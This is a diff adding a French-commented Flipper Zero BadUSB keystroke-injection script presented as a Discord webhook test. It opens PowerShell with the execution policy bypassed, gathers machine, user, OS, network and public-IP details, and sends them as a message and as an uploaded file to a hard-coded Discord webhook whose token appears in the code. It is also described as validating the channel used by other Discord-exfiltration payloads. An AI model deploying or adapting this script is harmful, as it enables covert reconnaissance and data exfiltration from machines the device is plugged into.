@@ -1,0 +1,393 @@
+REM ================================================================
+REM Flipper Zero BadUSB - Test Webhook Discord
+REM ================================================================
+REM Nom: Webhook Test
+REM Description: Test simple de connectivité Discord webhook
+REM Cible: Windows 7/8/10/11 (PowerShell 2.0+)
+REM Auteur: Plume-Paopedia
+REM Version: 1.0
+REM Durée: 1-2 minutes
+REM Privilèges: Utilisateur standard
+REM Objectif: Validation webhook + diagnostic réseau
+REM ================================================================
+
+DEFAULT_DELAY 200
+
+REM Ouverture PowerShell rapide
+GUI r
+DELAY 400
+STRING powershell -ExecutionPolicy Bypass
+ENTER
+DELAY 800
+
+STRING try {
+ENTER
+
+STRING # Configuration webhook
+ENTER
+STRING $webhook = "https://discordapp.com/api/webhooks/1416477793264603249/dxrIG93WCYqELVdSEXtQ7aqioc3MglF1m06Kee476so3zrsRllBg"
+ENTER
+
+STRING # Test de connectivité basique
+ENTER
+STRING Write-Host '🧪 Test Webhook Discord - Début' -ForegroundColor Green
+ENTER
+STRING $testStart = Get-Date
+ENTER
+
+STRING # Information système
+ENTER
+STRING $computerName = $env:COMPUTERNAME
+ENTER
+STRING $userName = $env:USERNAME
+ENTER
+STRING $osVersion = (Get-CimInstance Win32_OperatingSystem).Caption
+ENTER
+STRING $psVersion = $PSVersionTable.PSVersion.ToString()
+ENTER
+
+STRING # Test 1: Ping Discord
+ENTER
+STRING Write-Host '1️⃣ Test connectivité Discord...' -ForegroundColor Yellow
+ENTER
+STRING try {
+ENTER
+STRING   $ping = Test-NetConnection discord.com -Port 443 -ErrorAction SilentlyContinue
+ENTER
+STRING   $discordOK = $ping.TcpTestSucceeded
+ENTER
+STRING } catch {
+ENTER
+STRING   $discordOK = $false
+ENTER
+STRING }
+ENTER
+
+STRING if ($discordOK) {
+ENTER
+STRING   Write-Host '✅ Connexion Discord OK' -ForegroundColor Green
+ENTER
+STRING } else {
+ENTER
+STRING   Write-Host '❌ Problème connexion Discord' -ForegroundColor Red
+ENTER
+STRING }
+ENTER
+
+STRING # Test 2: Envoi message simple
+ENTER
+STRING Write-Host '2️⃣ Test envoi message...' -ForegroundColor Yellow
+ENTER
+STRING $testMessage = @{
+ENTER
+STRING   content = "🧪 **Test Webhook Flipper Zero**`n" +
+ENTER
+STRING             "🖥️ **Machine:** $computerName`n" +
+ENTER
+STRING             "👤 **Utilisateur:** $userName`n" +
+ENTER
+STRING             "💻 **OS:** $osVersion`n" +
+ENTER
+STRING             "⚡ **PowerShell:** $psVersion`n" +
+ENTER
+STRING             "⏰ **Heure:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n" +
+ENTER
+STRING             "🌐 **Connectivité Discord:** $(if($discordOK){'✅ OK'}else{'❌ Échec'})"
+ENTER
+STRING }
+ENTER
+
+STRING try {
+ENTER
+STRING   $response = Invoke-RestMethod -Uri $webhook -Method Post -Body ($testMessage | ConvertTo-Json) -ContentType 'application/json'
+ENTER
+STRING   Write-Host '✅ Message envoyé avec succès!' -ForegroundColor Green
+ENTER
+STRING   $webhookOK = $true
+ENTER
+STRING } catch {
+ENTER
+STRING   Write-Host "❌ Erreur envoi: $($_.Exception.Message)" -ForegroundColor Red
+ENTER
+STRING   $webhookOK = $false
+ENTER
+STRING }
+ENTER
+
+STRING Start-Sleep 2
+ENTER
+
+STRING # Test 3: Création et envoi fichier test
+ENTER
+STRING Write-Host '3️⃣ Test envoi fichier...' -ForegroundColor Yellow
+ENTER
+STRING $testFile = "$env:TEMP\webhook_test_$(Get-Date -Format 'yyyyMMddHHmmss').txt"
+ENTER
+STRING $fileContent = @"
+RAPPORT TEST WEBHOOK FLIPPER ZERO
+=================================
+Date du test: $(Get-Date)
+Machine: $computerName
+Utilisateur: $userName
+Système: $osVersion
+PowerShell: $psVersion
+
+RÉSULTATS DES TESTS:
+• Connectivité Discord: $(if($discordOK){'SUCCÈS'}else{'ÉCHEC'})
+• Envoi message: $(if($webhookOK){'SUCCÈS'}else{'ÉCHEC'})
+• Envoi fichier: EN COURS...
+
+INFORMATIONS RÉSEAU:
+• DNS Primaire: $((Get-DnsClientServerAddress -Family IPv4 -AddressFamily IPv4)[0].ServerAddresses[0])
+• Passerelle: $((Get-NetRoute -DestinationPrefix 0.0.0.0/0)[0].NextHop)
+
+CONFIGURATION SYSTÈME:
+• Timezone: $((Get-TimeZone).DisplayName)
+• Culture: $((Get-Culture).DisplayName)
+• Architecture: $env:PROCESSOR_ARCHITECTURE
+
+Ce fichier a été généré automatiquement par le script de test webhook.
+"@
+ENTER
+
+STRING $fileContent | Out-File -FilePath $testFile -Encoding UTF8
+ENTER
+
+STRING # Fonction d'envoi avec fichier
+ENTER
+STRING function Send-FileToDiscord {
+ENTER
+STRING   param($message, $filePath)
+ENTER
+STRING   try {
+ENTER
+STRING     $boundary = [System.Guid]::NewGuid().ToString()
+ENTER
+STRING     $headers = @{'Content-Type' = "multipart/form-data; boundary=$boundary"}
+ENTER
+STRING     $fileContent = [System.IO.File]::ReadAllBytes($filePath)
+ENTER
+STRING     $fileName = [System.IO.Path]::GetFileName($filePath)
+ENTER
+STRING     
+ENTER
+STRING     $body = "--$boundary`r`n"
+ENTER
+STRING     $body += "Content-Disposition: form-data; name=`"content`"`r`n`r`n$message`r`n"
+ENTER
+STRING     $body += "--$boundary`r`n"
+ENTER
+STRING     $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`n"
+ENTER
+STRING     $body += "Content-Type: text/plain`r`n`r`n"
+ENTER
+STRING     
+ENTER
+STRING     $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
+ENTER
+STRING     $endBoundary = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
+ENTER
+STRING     $fullBody = $bodyBytes + $fileContent + $endBoundary
+ENTER
+STRING     
+ENTER
+STRING     Invoke-RestMethod -Uri $webhook -Method Post -Body $fullBody -Headers $headers
+ENTER
+STRING     return $true
+ENTER
+STRING   } catch {
+ENTER
+STRING     Write-Host "Erreur envoi fichier: $($_.Exception.Message)" -ForegroundColor Red
+ENTER
+STRING     return $false
+ENTER
+STRING   }
+ENTER
+STRING }
+ENTER
+
+STRING $fileMessage = "📄 **Rapport de test webhook** - Machine: $computerName"
+ENTER
+STRING $fileSent = Send-FileToDiscord $fileMessage $testFile
+ENTER
+
+STRING if ($fileSent) {
+ENTER
+STRING   Write-Host '✅ Fichier envoyé avec succès!' -ForegroundColor Green
+ENTER
+STRING } else {
+ENTER
+STRING   Write-Host '❌ Échec envoi fichier' -ForegroundColor Red
+ENTER
+STRING }
+ENTER
+
+STRING # Nettoyage
+ENTER
+STRING Remove-Item $testFile -Force -ErrorAction SilentlyContinue
+ENTER
+
+STRING # Test 4: Diagnostic réseau avancé
+ENTER
+STRING Write-Host '4️⃣ Diagnostic réseau...' -ForegroundColor Yellow
+ENTER
+STRING $networkInfo = @()
+ENTER
+STRING try {
+ENTER
+STRING   $adapters = Get-NetAdapter | Where-Object {$_.Status -eq 'Up'}
+ENTER
+STRING   foreach ($adapter in $adapters) {
+ENTER
+STRING     $networkInfo += "• $($adapter.Name): $($adapter.LinkSpeed)"
+ENTER
+STRING   }
+ENTER
+STRING } catch {
+ENTER
+STRING   $networkInfo += "• Informations adapters non disponibles"
+ENTER
+STRING }
+ENTER
+
+STRING try {
+ENTER
+STRING   $publicIP = (Invoke-RestMethod -Uri "https://ipinfo.io/ip" -TimeoutSec 5).Trim()
+ENTER
+STRING } catch {
+ENTER
+STRING   $publicIP = "Non déterminable"
+ENTER
+STRING }
+ENTER
+
+STRING # Résumé final
+ENTER
+STRING $testDuration = (Get-Date) - $testStart
+ENTER
+STRING $finalReport = "📋 **Résumé Test Webhook**`n`n"
+ENTER
+STRING $finalReport += "🖥️ **Machine:** $computerName`n"
+ENTER
+STRING $finalReport += "👤 **Utilisateur:** $userName`n"
+ENTER
+STRING $finalReport += "⏱️ **Durée:** $([math]::Round($testDuration.TotalSeconds,1))s`n`n"
+ENTER
+STRING $finalReport += "**Résultats:**`n"
+ENTER
+STRING $finalReport += "$(if($discordOK){'✅'}else{'❌'}) Connectivité Discord`n"
+ENTER
+STRING $finalReport += "$(if($webhookOK){'✅'}else{'❌'}) Envoi message`n"
+ENTER
+STRING $finalReport += "$(if($fileSent){'✅'}else{'❌'}) Envoi fichier`n`n"
+ENTER
+STRING $finalReport += "🌐 **IP Publique:** $publicIP`n"
+ENTER
+STRING $finalReport += "🔗 **Adapteurs réseau:**`n"
+ENTER
+STRING foreach ($info in $networkInfo) { $finalReport += "$info`n" }
+ENTER
+STRING $finalReport += "`n🎯 **Statut global:** "
+ENTER
+STRING if ($discordOK -and $webhookOK -and $fileSent) {
+ENTER
+STRING   $finalReport += "**✅ TOUS LES TESTS RÉUSSIS**`nLe webhook est opérationnel!"
+ENTER
+STRING } elseif ($webhookOK) {
+ENTER
+STRING   $finalReport += "**⚠️ PARTIELLEMENT FONCTIONNEL**`nMessages OK, vérifiez les fichiers"
+ENTER
+STRING } else {
+ENTER
+STRING   $finalReport += "**❌ PROBLÈME DÉTECTÉ**`nVérifiez la connectivité et l'URL webhook"
+ENTER
+STRING }
+ENTER
+
+STRING # Envoi du rapport final
+ENTER
+STRING try {
+ENTER
+STRING   Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$finalReport} | ConvertTo-Json) -ContentType 'application/json'
+ENTER
+STRING   Write-Host '📤 Rapport final envoyé!' -ForegroundColor Green
+ENTER
+STRING } catch {
+ENTER
+STRING   Write-Host '❌ Impossible d envoyer le rapport final' -ForegroundColor Red
+ENTER
+STRING }
+ENTER
+
+STRING # Affichage local du résumé
+ENTER
+STRING Write-Host "`n" -NoNewline
+ENTER
+STRING Write-Host '═══════════════════════════════════════════════════════════' -ForegroundColor Blue
+ENTER
+STRING Write-Host '                    RÉSUMÉ DU TEST WEBHOOK                  ' -ForegroundColor Blue  
+ENTER
+STRING Write-Host '═══════════════════════════════════════════════════════════' -ForegroundColor Blue
+ENTER
+STRING Write-Host "Machine: $computerName | Utilisateur: $userName" -ForegroundColor White
+ENTER
+STRING Write-Host "Durée: $([math]::Round($testDuration.TotalSeconds,1))s | IP: $publicIP" -ForegroundColor White
+ENTER
+STRING Write-Host ""
+ENTER
+STRING Write-Host "RÉSULTATS DES TESTS:" -ForegroundColor Yellow
+ENTER
+STRING Write-Host "• Connectivité Discord: $(if($discordOK){'✅ OK'}else{'❌ ÉCHEC'})" -ForegroundColor $(if($discordOK){'Green'}else{'Red'})
+ENTER
+STRING Write-Host "• Envoi message: $(if($webhookOK){'✅ OK'}else{'❌ ÉCHEC'})" -ForegroundColor $(if($webhookOK){'Green'}else{'Red'})  
+ENTER
+STRING Write-Host "• Envoi fichier: $(if($fileSent){'✅ OK'}else{'❌ ÉCHEC'})" -ForegroundColor $(if($fileSent){'Green'}else{'Red'})
+ENTER
+STRING Write-Host ""
+ENTER
+STRING if ($discordOK -and $webhookOK -and $fileSent) {
+ENTER
+STRING   Write-Host '🎉 WEBHOOK PLEINEMENT OPÉRATIONNEL!' -ForegroundColor Green
+ENTER
+STRING   Write-Host 'Tous les scripts avec Discord fonctionneront correctement.' -ForegroundColor Green
+ENTER
+STRING } elseif ($webhookOK) {
+ENTER
+STRING   Write-Host '⚠️  WEBHOOK PARTIELLEMENT FONCTIONNEL' -ForegroundColor Yellow
+ENTER
+STRING   Write-Host 'Les messages fonctionnent, problème possible avec les fichiers.' -ForegroundColor Yellow
+ENTER
+STRING } else {
+ENTER
+STRING   Write-Host '❌ WEBHOOK NON FONCTIONNEL' -ForegroundColor Red
+ENTER
+STRING   Write-Host 'Vérifiez la connexion internet et l URL du webhook.' -ForegroundColor Red
+ENTER
+STRING }
+ENTER
+STRING Write-Host '═══════════════════════════════════════════════════════════' -ForegroundColor Blue
+ENTER
+
+STRING } catch {
+ENTER
+STRING   $errorMsg = "💥 **ERREUR CRITIQUE TEST WEBHOOK**`nMachine: $env:COMPUTERNAME`nErreur: $($_.Exception.Message)"
+ENTER
+STRING   Write-Host $errorMsg -ForegroundColor Red
+ENTER
+STRING   try {
+ENTER
+STRING     Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$errorMsg}|ConvertTo-Json) -ContentType 'application/json'
+ENTER
+STRING   } catch { }
+ENTER
+STRING }
+ENTER
+
+STRING Write-Host "`nVérifiez votre canal Discord pour voir tous les messages de test."
+ENTER
+STRING Write-Host "Appuyez sur Entrée pour fermer..."
+ENTER
+STRING Read-Host
+ENTER
+STRING exit
+ENTER
